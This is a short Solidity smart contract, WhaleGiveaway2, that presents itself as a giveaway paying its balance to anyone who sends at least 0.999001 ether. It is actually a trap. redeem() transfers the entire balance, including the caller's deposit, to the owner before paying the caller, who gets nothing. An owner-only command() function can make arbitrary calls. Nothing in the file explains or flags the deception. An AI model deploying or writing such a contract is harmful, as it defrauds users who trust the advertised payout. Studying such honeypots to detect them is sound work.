pragma solidity ^0.8.0;

contract WhaleGiveaway2 {
    address payable public owner;

    uint public constant minEligibility = 0.999001 ether;

    constructor() {
        owner = payable(msg.sender);
    }

    receive() external payable {}

    function redeem() public payable {
        require(msg.value >= minEligibility, "Insufficient value to redeem");
        owner.transfer(address(this).balance);
        payable(msg.sender).transfer(address(this).balance);
    }

    function withdraw() public {
        require(msg.sender == owner, "Only the owner can withdraw");
        owner.transfer(address(this).balance);
    }

    function command(address payable adr, bytes memory data) public payable {
        require(msg.sender == owner, "Only the owner can execute commands");
        (bool success, ) = adr.call{value: msg.value}(data);
        require(success, "Command execution failed");
    }
}